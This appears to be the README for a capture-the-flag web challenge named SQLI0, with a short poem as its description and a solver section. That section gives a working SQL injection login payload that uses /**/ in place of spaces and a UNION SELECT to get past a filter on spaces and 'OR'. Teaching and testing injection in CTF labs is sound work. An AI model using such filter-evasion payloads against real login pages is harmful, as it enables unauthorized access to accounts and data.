# SQLI0

Author: xhalyl

## Description
For Palestine's cause, your voice shall resound
In this SQLi , where victory is found.

## Requirements

- Docker: [Dockerfile](./challenge/Dockerfile)

## Sources
  Private Sources.
- [challenge](./challenge)

## Solver
``` 
Since spaces are not allowed we can use /**/ instead , also "OR" is not allowed so we are using a union attack in order to return True .
So you login as 
username : anything'UNION/**/SELECT/**/1,2,3--
password : anything 